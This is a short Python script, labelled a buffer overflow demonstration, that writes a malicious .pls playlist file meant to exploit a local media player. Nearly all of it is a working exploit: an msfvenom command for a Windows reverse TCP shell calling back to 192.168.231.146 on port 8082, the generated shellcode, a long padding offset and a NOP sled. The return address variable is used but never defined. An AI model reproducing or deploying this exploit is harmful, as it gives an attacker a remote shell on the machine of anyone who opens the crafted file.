#!usr/bin/env python
#Buffer Overflow Demonstration
#Type : Local Exploitation
#To get a clean exit, Exitfunc as thread can be included in payload so that app does not crashes.	

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.231.146 LPORT=8082 -b "\x00\x09\x0a" EXITFUNC=thread -f c
shellcode = ("\xd9\xee\xd9\x74\x24\xf4\x5f\x29\xc9\xba\x7b\x21\xb7\x86\xb1"
"\x52\x83\xef\xfc\x31\x57\x13\x03\x2c\x32\x55\x73\x2e\xdc\x1b"
"\x7c\xce\x1d\x7c\xf4\x2b\x2c\xbc\x62\x38\x1f\x0c\xe0\x6c\xac"
"\xe7\xa4\x84\x27\x85\x60\xab\x80\x20\x57\x82\x11\x18\xab\x85"
"\x91\x63\xf8\x65\xab\xab\x0d\x64\xec\xd6\xfc\x34\xa5\x9d\x53"
"\xa8\xc2\xe8\x6f\x43\x98\xfd\xf7\xb0\x69\xff\xd6\x67\xe1\xa6"
"\xf8\x86\x26\xd3\xb0\x90\x2b\xde\x0b\x2b\x9f\x94\x8d\xfd\xd1"
"\x55\x21\xc0\xdd\xa7\x3b\x05\xd9\x57\x4e\x7f\x19\xe5\x49\x44"
"\x63\x31\xdf\x5e\xc3\xb2\x47\xba\xf5\x17\x11\x49\xf9\xdc\x55"
"\x15\x1e\xe2\xba\x2e\x1a\x6f\x3d\xe0\xaa\x2b\x1a\x24\xf6\xe8"
"\x03\x7d\x52\x5e\x3b\x9d\x3d\x3f\x99\xd6\xd0\x54\x90\xb5\xbc"
"\x99\x99\x45\x3d\xb6\xaa\x36\x0f\x19\x01\xd0\x23\xd2\x8f\x27"
"\x43\xc9\x68\xb7\xba\xf2\x88\x9e\x78\xa6\xd8\x88\xa9\xc7\xb2"
"\x48\x55\x12\x14\x18\xf9\xcd\xd5\xc8\xb9\xbd\xbd\x02\x36\xe1"
"\xde\x2d\x9c\x8a\x75\xd4\x77\x75\x21\x31\x15\x1d\x30\xbd\x05"
"\x4e\xbd\x5b\x53\x7e\xe8\xf4\xcc\xe7\xb1\x8e\x6d\xe7\x6f\xeb"
"\xae\x63\x9c\x0c\x60\x84\xe9\x1e\x15\x64\xa4\x7c\xb0\x7b\x12"
"\xe8\x5e\xe9\xf9\xe8\x29\x12\x56\xbf\x7e\xe4\xaf\x55\x93\x5f"
"\x06\x4b\x6e\x39\x61\xcf\xb5\xfa\x6c\xce\x38\x46\x4b\xc0\x84"
"\x47\xd7\xb4\x58\x1e\x81\x62\x1f\xc8\x63\xdc\xc9\xa7\x2d\x88"
"\x8c\x8b\xed\xce\x90\xc1\x9b\x2e\x20\xbc\xdd\x51\x8d\x28\xea"
"\x2a\xf3\xc8\x15\xe1\xb7\xe9\xf7\x23\xc2\x81\xa1\xa6\x6f\xcc"
"\x51\x1d\xb3\xe9\xd1\x97\x4c\x0e\xc9\xd2\x49\x4a\x4d\x0f\x20"
"\xc3\x38\x2f\x97\xe4\x68")

offset = "A" * 17417
buffer= "http://" + offset + ret + "\x90" * 16 + shellcode

file1= open("msf.pls",'wb')
file1.write(buffer)
print "Creating msf.pls file..."
file1.close()
